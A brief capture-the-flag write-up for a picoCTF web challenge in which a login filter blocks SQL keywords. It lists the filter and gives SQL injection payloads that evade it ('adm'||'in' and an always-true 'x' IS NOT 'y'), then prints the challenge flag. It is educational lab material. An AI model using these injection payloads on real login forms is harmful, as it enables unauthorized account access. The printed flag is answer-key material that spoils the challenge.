# Web Gauntlet 1 - web 

## Challenge

This website looks familiar... Log in as `admin` Site:

## Solve:

The `/filter.php` link shows the following filters:

```
Filters: or and true false union like = > < ; -- /* */ admin
```

We can bypass the `admin` with the payload used in the Web Gauntlet 1 challenge:

`adm'||'in`

The password filters can be bypassed to create an always `True` condition with: 

`x' IS NOT 'y`

Submitting the credentials presents the flag:

`picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}`